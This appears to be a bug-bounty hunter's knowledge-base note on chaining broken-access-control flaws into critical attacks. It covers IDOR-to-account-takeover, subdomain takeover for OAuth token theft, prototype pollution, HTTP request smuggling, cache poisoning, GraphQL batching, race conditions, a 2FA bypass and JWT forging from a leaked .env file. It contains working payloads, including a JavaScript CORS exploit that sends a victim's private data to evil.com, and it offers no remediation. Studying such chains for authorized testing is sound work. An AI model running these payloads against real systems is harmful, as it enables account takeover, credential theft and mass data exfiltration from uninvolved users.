---
tags: [bac, advanced, chaining, prototype-pollution, cache-poisoning]
type: attack
severity: critical
date: 2026-03-10
---

# 🧬 Advanced BAC Chains & Emerging Techniques

## The Power of Chaining
A medium IDOR + a medium information disclosure = **Critical account takeover**. Advanced hunters don't find single bugs — they build chains. This note documents the most impactful chaining patterns and cutting-edge BAC techniques.

---

## Chain 1: IDOR → Account Takeover (Classic)

```
Step 1: IDOR on /api/user/{id}/password-reset-token
  GET /api/user/9999/password-reset-token
  → {"reset_token": "abc123xyz"}

Step 2: Use token to reset password
  POST /api/reset-password
  {"token": "abc123xyz", "new_password": "H4ck3d!"}

Step 3: Login as victim → Full account takeover
Impact: Critical (9.8 CVSS)
```

---

## Chain 2: Information Disclosure → IDOR Chain

```
Step 1: IDOR on low-value endpoint (verbose error)
  GET /api/invoice/9998 → {"error": "Invoice 9998 belongs to user@victim.com"}
  → Leak: victim's email

Step 2: Password reset via email
  POST /api/forgot-password {"email": "user@victim.com"}
  
Step 3: IDOR on reset token endpoint
  GET /api/user/9998/pending-reset-token → {"token": "xyz"}

→ Account takeover chain from seemingly low-impact IDOR
```

---

## Chain 3: CORS + IDOR = Authenticated Data Exfiltration

```javascript
// Attacker hosts evil.com
// Victim visits evil.com while logged into target.com

fetch("https://api.target.com/user/me", {credentials: "include"})
  .then(r => r.json())
  .then(data => {
    // Extract victim's user ID
    let victimId = data.id;
    
    // Now use victim's session (via CORS) to IDOR into their data
    return fetch(`https://api.target.com/user/${victimId}/private-data`, 
      {credentials: "include"});
  })
  .then(r => r.json())
  .then(privateData => {
    // Exfiltrate to attacker's server
    fetch("https://evil.com/steal?data=" + btoa(JSON.stringify(privateData)));
  });

// This works when:
// 1. CORS reflects origin with credentials
// 2. IDOR exists on private-data endpoint
```

---

## Chain 4: Subdomain Takeover → OAuth Token Theft

```
Step 1: Find old OAuth redirect_uri pointing to dead subdomain
  redirect_uri: https://legacy.target.com/oauth/callback
  
Step 2: legacy.target.com CNAME → expired S3/GitHub/Heroku
  → Claim the subdomain (subdomain takeover)
  
Step 3: Host malicious callback at legacy.target.com
  → Receives OAuth authorization codes for all users who click OAuth link
  
Step 4: Exchange codes for access tokens
  → Access any user's account
  
Impact: Critical mass account takeover
```

---

## Chain 5: Mass Assignment → Privilege Escalation → Lateral Movement

```
Step 1: Mass assignment sets isAdmin=true on own account
  PATCH /api/profile {"name":"x","isAdmin":true}

Step 2: Use admin privileges to dump all users
  GET /api/admin/users → {"users":[{"id":1,"email":"admin@target.com",...}]}

Step 3: IDOR on admin user's API key
  GET /api/admin/user/1/api-key → {"key":"sk_live_XXXX"}

Step 4: Use API key for platform-level access
  → Access all customer data, billing, infrastructure
```

---

## Technique: Prototype Pollution → BAC Bypass

```javascript
// In Node.js applications, prototype pollution can corrupt
// authorization checks:

// Vulnerable server-side code:
function isAdmin(user) {
    return user.role === 'admin';  // checks own property
}

// If attacker pollutes Object.prototype:
// POST /api/merge {"__proto__": {"role": "admin"}}
// Now: {}.role === 'admin' → true for ALL objects!

// Test for prototype pollution:
POST /api/settings
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// If subsequent requests grant admin access → prototype pollution → BAC
```

---

## Technique: HTTP Request Smuggling → BAC Bypass

```
CL.TE Smuggling can bypass front-end access controls:

Front-end (proxy):  POST /admin → BLOCKED
Back-end (server):  Receives smuggled request as if from internal

Attack:
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 58

0

GET /admin HTTP/1.1
Host: target.com
X-Ignore: X

→ Back-end processes smuggled GET /admin
→ Bypasses front-end access control
```

---

## Technique: Cache Poisoning → BAC Bypass

```
If a CDN caches responses based on URL only (not auth):

Step 1: Poison the cache for /api/admin/stats with your response
  GET /api/admin/stats?cb=12345
  X-Forwarded-Host: evil.com
  → Response cached with poisoned data or wrong CORS headers

Step 2: Victim requests /api/admin/stats
  → Receives poisoned/attacker-controlled response
  
Or: Cache a 200 response from when YOU had admin access
→ Future requests by others get cached admin data
```

---

## Technique: GraphQL Batching for Enumeration

```graphql
# Instead of 1000 individual requests (rate-limited),
# batch them into fewer requests:

[
  {"query": "query { user(id: 1) { email password_hash } }"},
  {"query": "query { user(id: 2) { email password_hash } }"},
  ...100 queries per request...
]

# 10 requests × 100 queries = 1000 user records
# Rate limiter sees 10 requests, not 1000
# Combine with BOLA for mass user data exfil
```

---

## Technique: 4xx → 2xx Response Code Manipulation

```
For client-side rendered apps where 403 response
still returns some data in the body:

GET /admin/dashboard HTTP/1.1
→ 403 Forbidden
  {"status": "error", "data": {"total_users": 15000, "revenue": 2500000}}

The data is there in the response, just with wrong status code.
→ Look carefully at 403 response BODIES, not just status codes
```

---

## Impact Escalation Matrix

```
Single Bug       → Chain Opportunity
─────────────────────────────────────────────────────────
IDOR (read)      → + IDOR (write) = Data tampering
IDOR (read)      → + Password reset endpoint = ATO
CORS             → + IDOR = Remote authenticated data theft  
Mass assignment  → + Admin API = Full platform access
Open redirect    → + OAuth = Token theft
Subdomain takeo  → + OAuth redirect_uri = Mass ATO
Prototype poll.  → + Auth check = Blanket admin access
Request smugg.   → + Admin endpoint = ACL bypass
Low-priv IDOR    → + High-priv IDOR = Critical chain
```

---

## Tasks
- [ ] #task After finding any IDOR — check for password reset chains
- [ ] #task After finding CORS — attempt authenticated IDOR chaining
- [ ] #task Test prototype pollution on Node.js targets (`__proto__` injection)
- [ ] #task Check if GraphQL batching bypasses rate limits for enumeration
- [ ] #task Inspect 403 response bodies — may contain partial data
- [ ] #task After mass assignment — test what admin capabilities are gained
- [ ] #task Look for dead OAuth redirect URIs → subdomain takeover chain

---

## 🔗 Related Notes
- [[IDOR-Techniques]]
- [[CORS-Misconfiguration]]
- [[OAuth-SSO-BAC]]
- [[Mass-Assignment]]
- [[API-BAC]]

---
*Tags: #advanced #chaining #prototype-pollution #bac #critical*

---

## Chain 6: Race Condition + IDOR = Double-Spend / Duplicate Resource Access

```
Setup: User A creates a document. Sharing link generated.
       Link is single-use (marked "consumed" after first access).

Race:
  50 concurrent GET /api/share/SHARE_TOKEN requests

If the "mark as consumed" is not atomic:
  → Multiple requests pass the "is_consumed = false" check
  → All receive the document content
  → Link used 50 times instead of 1

Financial variant:
  Coupon code: 50% off, single use
  50 concurrent POST /api/coupon/redeem {"code": "HALF50"}
  → If check and mark not atomic: all 50 succeed
  → Effective: 50× coupon use from one code

See also: [[Race-Condition-BAC]]
```

---

## Chain 7: 2FA Bypass via IDOR on Verification Endpoint

```
Scenario: Login flow requires 2FA code after password

Normal:
  POST /auth/login {"email":"victim","password":"P4ss"} 
  → {"status":"pending_2fa","session_token":"TEMP_TOKEN"}
  POST /auth/verify-2fa {"token":"TEMP_TOKEN","code":"123456"}
  → {"access_token":"FULL_TOKEN"}

Attack:
  Step 1: Use your own account's valid TEMP_TOKEN
  Step 2: Find that TEMP_TOKEN contains user_id (decode JWT/inspect)
  Step 3: IDOR: swap your user_id for victim's user_id in the token
          OR: swap TEMP_TOKEN in /verify-2fa for victim's TEMP_TOKEN
  Step 4: Submit valid 2FA code for YOUR account
  Step 5: If 2FA check doesn't bind code to specific user_id:
          → Your valid code verifies victim's pending session
  
Impact: Full account takeover, bypasses 2FA entirely
CVSS: 9.8 Critical
```

---

## Chain 8: Email Verification Bypass → Account Privilege

```
Many apps:
  Unverified account: limited functionality
  Verified account: full access, higher trust, more data visible

Attack:
  Step 1: Create your own account (not verified)
  Step 2: IDOR on /api/user/{id}/verification-status
          GET /api/user/YOUR_ID/verification-status 
          → {"verified": false, "token": "abc123"}
          
  Step 3: PATCH /api/user/YOUR_ID/verify {"token":"abc123"}
          → {"verified": true}
  
  Step 4: IDOR the PATCH: change YOUR_ID to VICTIM_ID
          → Victim account gets verified (or: mark yours verified without email)
  
  Variant: 
    POST /api/resend-verification {"user_id": VICTIM_ID}
    → Flood victim with verification emails (DoS)
    → Or: observe that YOUR verification token works for VICTIM's user_id
```

---

## Chain 9: Forced Browsing → Credential Leak → Full Access

```
Step 1: .env file exposed (forced browsing)
  GET /.env →
  DATABASE_URL=postgres://admin:P4ssw0rd@db.internal:5432/prod
  ADMIN_API_KEY=sk_live_xxxx
  JWT_SECRET=super_secret_key

Step 2: Use JWT_SECRET → forge any JWT with admin role
  python3 jwt_tool.py -S hs256 -k "super_secret_key" NEW_TOKEN

Step 3: Use ADMIN_API_KEY for API access
  Authorization: Bearer sk_live_xxxx

Step 4: Use DATABASE_URL (if RDS exposed) → direct DB access

Impact: Complete platform compromise from one exposed file
See: [[Forced-Browsing]]
```
